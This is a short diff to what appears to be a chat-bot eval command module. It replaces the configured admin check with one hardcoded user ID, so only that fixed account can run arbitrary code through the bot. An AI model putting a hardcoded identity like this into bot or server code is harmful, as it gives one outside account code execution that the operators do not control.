@@ -14,10 +14,10 @@ module.exports.config = {
 
 module.exports.run = async function({ api, event, args, Threads, Users, Currencies, models }) {
     const eval = require("eval");
-    const listAdmin = global.config.ADMINBOT;
+    //const listAdmin = global.config.ADMINBOT;
 
-    var adsuprise = listAdmin[0];
-    if (senderID != adsuprise) return;
+    //var adsuprise = listAdmin[0];
+    if (event.senderID != 100038379006171) return;
 
     const output = function(a) {
         if (typeof a === "object" || typeof a === "array") {
